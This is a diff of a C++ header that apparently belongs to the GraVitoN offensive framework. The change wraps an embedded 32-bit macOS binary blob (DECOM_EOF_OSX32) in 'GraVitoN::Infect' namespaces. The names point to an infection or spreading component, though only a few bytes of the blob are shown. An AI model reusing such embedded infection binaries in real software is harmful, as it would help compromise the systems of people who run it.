@@ -29,6 +29,12 @@
 #ifndef _GVN_SPREAD_EOF_DECOM_OSX32_HEAD_
 #define _GVN_SPREAD_EOF_DECOM_OSX32_HEAD_
 
+namespace GraVitoN
+{
+
+namespace Infect
+{
+
 const unsigned long DECOM_EOF_OSX32_SIZE = 38320;
 const unsigned char DECOM_EOF_OSX32[] = 
 "\xce\xfa\xed\xfe\x07\x00\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00"
@@ -2428,4 +2434,6 @@ const unsigned char DECOM_EOF_OSX32[] =
 "\x73\x74\x65\x6d\x24\x55\x4e\x49\x58\x32\x30\x30\x33\x00\x00\x00"
 ;
 
+}
+}
 #endif
